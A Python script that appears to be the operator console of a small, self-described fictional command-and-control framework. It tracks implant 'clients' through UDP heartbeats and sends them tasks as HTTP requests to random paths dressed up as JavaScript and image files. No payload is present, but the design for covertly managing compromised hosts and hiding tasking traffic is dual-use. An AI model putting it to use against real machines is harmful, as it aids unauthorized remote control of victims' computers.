#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread, Event
from time import time, sleep

import sys
import requests
import random
import socket

from dictionnaries.file_name import files
from dictionnaries.task_name import tasks

client_list = dict()
timeout_max = 60
connected = False
PORT = 8080

def help():
    print("Here is the help. You'll don't have real help as it is a fictional framework")


# If task=False then build uri file is called
# Else build uri task is called
def send(ip, port, content="", task=True):
    URL = (lambda: build_uri_task() if task else build_uri_file())()
    req = requests.get(url=f'http://{ip}:{port}{URL}', params={})
    return



def build_uri_task(uri_start = '/scripts/', ext='.js'):
    return uri_start + random.choice(tasks) + ext


def build_uri_file(uri_start='/pictures/', ext='.png'):
    return uri_start + random.choice(files) + ext


def run_server(stop_event, ip="0.0.0.0", port=8000, server_class=HTTPServer, handler_class=BaseHTTPRequestHandler):
    server_address = (ip, port)
    httpd = server_class(server_address, handler_class)
    # Set a timeout for handle_request to periodically check stop_event
    httpd.timeout = 1  # 1-second timeout
    while not stop_event.is_set():
        httpd.handle_request()  # Handle a single request at a time with a timeout
    httpd.server_close()
    print("HTTP server stopped.")


def command_loop(stop_event):
    while not stop_event.is_set():
        user_in = input("$: ").split()
        try:
            match user_in[0]:
                case "help": help()
                case "kill": send(connected, PORT, task=False)
                case "ls": send(connected, PORT)
                case "clients": 
                    show_clients()
                    print("Type `use <ip>` to connect to a client.")
                case "use": 
                    if len(user_in) != 2: 
                        print("Usage: `use <ip>`") 
                        return
                    use_cmd(user_in[1])
                case "exit": stop_event.set()
                case _: print("Command not recognized.")
        except IndexError:
            pass


def use_cmd(ip):
    global connected
    if connected:
        print("Already connected.")
    else:
        if ip not in client_list.keys():
            print("Unrecognized client.")
            return
        connected = ip
        print("Now using: ", connected)
        URL=build_uri_file(uri_start="/images/", ext=".png")
        requests.get(url=f'http://{connected}:{PORT}{URL}', params={})


def show_clients():
    current = time()
    if client_list.keys():
        for key in client_list.keys():
            print(f'IP: {key}, last time heard: {current - client_list[key]: .2f}s ago.')
    else:
        print("No clients connected.")


def receive_heartbeat(stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 5000))
    while not stop_event.is_set():
        try:
            sock.settimeout(2.0)
            data, addr = sock.recvfrom(512)
            if not addr[0] in client_list.keys():
                print("New client connected: ", addr[0])
            client_list[addr[0]] = time()
        except:
            pass
    print("Hearbeat receiver stopped")


def check_neighbor(stop_event):
    to = 20
    last = 0
    while not stop_event.is_set():
        current = time()
        if current > last + to or last == 0:
            last = current
            to_del = False
            for key in client_list.keys():
                if client_list[key] + timeout_max < current:
                    to_del = key
                    break
            if to_del:
                del client_list[to_del]
        sleep(0.1)
    print("Check neighbor stopped")



if __name__ == "__main__":
    print("ok")

    stop_event = Event()


    t1 = Thread(target=run_server, args=(stop_event, ))
    print("HTTP server listening.")
    t2 = Thread(target=command_loop, args=(stop_event, ))
    t3 = Thread(target=receive_heartbeat, args=(stop_event, ))
    t4 = Thread(target=check_neighbor, args=(stop_event, ))
    
    t1.start(), t2.start(), t3.start(), t4.start()
    t1.join(), t2.join(), t3.join(), t4.join()